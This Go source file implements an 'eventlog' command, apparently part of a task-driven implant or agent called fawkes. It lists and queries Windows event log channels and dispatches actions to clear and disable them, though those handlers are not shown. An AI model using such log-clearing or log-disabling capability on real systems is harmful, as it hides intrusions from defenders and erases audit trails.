//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	wevtapi                     = windows.NewLazySystemDLL("wevtapi.dll")
	procEvtOpenChannelEnum      = wevtapi.NewProc("EvtOpenChannelEnum")
	procEvtNextChannelPath      = wevtapi.NewProc("EvtNextChannelPath")
	procEvtQuery                = wevtapi.NewProc("EvtQuery")
	procEvtNext                 = wevtapi.NewProc("EvtNext")
	procEvtRender               = wevtapi.NewProc("EvtRender")
	procEvtClose                = wevtapi.NewProc("EvtClose")
	procEvtOpenLog              = wevtapi.NewProc("EvtOpenLog")
	procEvtGetLogInfo           = wevtapi.NewProc("EvtGetLogInfo")
	procEvtClearLog             = wevtapi.NewProc("EvtClearLog")
	procEvtOpenChannelConfig    = wevtapi.NewProc("EvtOpenChannelConfig")
	procEvtSetChannelConfigProp = wevtapi.NewProc("EvtSetChannelConfigProperty")
	procEvtSaveChannelConfig    = wevtapi.NewProc("EvtSaveChannelConfig")
	procEvtGetChannelConfigProp = wevtapi.NewProc("EvtGetChannelConfigProperty")
)

const (
	evtQueryChannelPath      = 0x1
	evtQueryReverseDirection = 0x200
	evtRenderEventXml        = 1
	evtOpenChannelPath       = 1
	evtLogNumberOfLogRecords = 5
	evtLogFileSize           = 3
	evtLogLastWriteTime      = 2
	errorNoMoreItems         = 259
	errorInsufficientBuffer  = 122
	evtChannelConfigEnabled  = 0 // EvtChannelConfigEnabled property ID
)

// EventLogCommand manages Windows Event Logs
type EventLogCommand struct{}

func (c *EventLogCommand) Name() string {
	return "eventlog"
}

func (c *EventLogCommand) Description() string {
	return "Manage Windows Event Logs — list, query, clear, info, enable, disable channels"
}

type eventlogArgs struct {
	Action  string `json:"action"`
	Channel string `json:"channel"`
	Filter  string `json:"filter"`
	EventID int    `json:"event_id"`
	Count   int    `json:"count"`
}

func (c *EventLogCommand) Execute(task structs.Task) structs.CommandResult {
	var args eventlogArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Failed to parse parameters: %v", err)
		}
	}

	if args.Action == "" {
		args.Action = "list"
	}

	switch args.Action {
	case "list":
		return evtListChannels(args.Filter)
	case "query":
		return evtQueryEvents(args.Channel, args.Filter, args.EventID, args.Count)
	case "clear":
		return evtClear(args.Channel)
	case "info":
		return evtInfo(args.Channel)
	case "enable":
		return evtSetChannelEnabled(args.Channel, true)
	case "disable":
		return evtSetChannelEnabled(args.Channel, false)
	default:
		return errorf("Unknown action: %s (use list, query, clear, info, enable, disable)", args.Action)
	}
}

func evtListChannels(filter string) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	enumHandle, _, err := procEvtOpenChannelEnum.Call(0, 0)
	if enumHandle == 0 {
		return errorf("EvtOpenChannelEnum failed: %v", err)
	}
	defer procEvtClose.Call(enumHandle)

	var channels []string
	buf := make([]uint16, 512)

	for {
		var used uint32
		ret, _, callErr := procEvtNextChannelPath.Call(
			enumHandle,
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(unsafe.Pointer(&used)),
		)
		if ret == 0 {
			e, ok := callErr.(windows.Errno)
			if !ok {
				break
			}
			errno := uintptr(e)
			if errno == errorNoMoreItems {
				break
			}
			if errno == errorInsufficientBuffer {
				buf = make([]uint16, used)
				continue
			}
			break
		}
		name := windows.UTF16ToString(buf[:used])
		if filter == "" || strings.Contains(strings.ToLower(name), strings.ToLower(filter)) {
			channels = append(channels, name)
		}
	}

	if len(channels) == 0 {
		msg := "No event log channels found"
		if filter != "" {
			msg += fmt.Sprintf(" matching '%s'", filter)
		}
		return successResult(msg)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Event Log Channels (%d", len(channels)))
	if filter != "" {
		sb.WriteString(fmt.Sprintf(", filter: '%s'", filter))
	}
	sb.WriteString("):\n\n")
	for _, ch := range channels {
		sb.WriteString(fmt.Sprintf("  %s\n", ch))
	}

	return successResult(sb.String())
}

func evtQueryEvents(channel, filter string, eventID, maxCount int) structs.CommandResult {
	if channel == "" {
		return errorResult("Channel is required for query action (e.g., Security, System, Application)")
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Build XPath query
	xpath := buildEventXPath(filter, eventID)

	channelPtr, _ := windows.UTF16PtrFromString(channel)
	var queryPtr uintptr
	if xpath != "*" {
		xpathUTF16, _ := windows.UTF16PtrFromString(xpath)
		queryPtr = uintptr(unsafe.Pointer(xpathUTF16))
	}

	queryHandle, _, err := procEvtQuery.Call(
		0,
		uintptr(unsafe.Pointer(channelPtr)),
		queryPtr,
		evtQueryChannelPath|evtQueryReverseDirection,
	)
	if queryHandle == 0 {
		return errorf("EvtQuery failed on '%s': %v\nXPath: %s", channel, err, xpath)
	}
	defer procEvtClose.Call(queryHandle)

	if maxCount <= 0 {
		maxCount = 50
	}

	// Fetch events
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Events from '%s' (max %d, newest first):\n", channel, maxCount))
	if xpath != "*" {
		sb.WriteString(fmt.Sprintf("XPath: %s\n", xpath))
	}
	sb.WriteString("\n")

	total := 0
	const batchSize = 10
	events := make([]uintptr, batchSize)

	for total < maxCount {
		var returned uint32
		ret, _, fetchErr := procEvtNext.Call(
			queryHandle,
			uintptr(batchSize),
			uintptr(unsafe.Pointer(&events[0])),
			5000,
			0,
			uintptr(unsafe.Pointer(&returned)),
		)
		if ret == 0 {
			e, ok := fetchErr.(windows.Errno)
			if !ok {
				sb.WriteString(fmt.Sprintf("EvtNext error: %v\n", fetchErr))
				break
			}
			if uintptr(e) == errorNoMoreItems {
				break
			}
			sb.WriteString(fmt.Sprintf("EvtNext error: %v\n", fetchErr))
			break
		}

		for i := uint32(0); i < returned; i++ {
			if total < maxCount {
				xml, renderErr := renderEventXML(events[i])
				procEvtClose.Call(events[i])
				if renderErr != nil {
					continue
				}
				summary := summarizeEventXML(xml)
				sb.WriteString(fmt.Sprintf("[%d] %s\n", total+1, summary))
				total++
			} else {
				procEvtClose.Call(events[i])
			}
		}
	}

	if total == 0 {
		sb.WriteString("No events found matching the query.\n")
	} else {
		sb.WriteString(fmt.Sprintf("\nTotal: %d events returned\n", total))
	}

	return successResult(sb.String())
}

// summarizeEventXML, extractXMLField, extractXMLAttr, buildEventXPath,
// formatEvtLogSize moved to command_helpers.go
// windowsFileTimeToString, daysToDate moved to eventlog_helpers.go
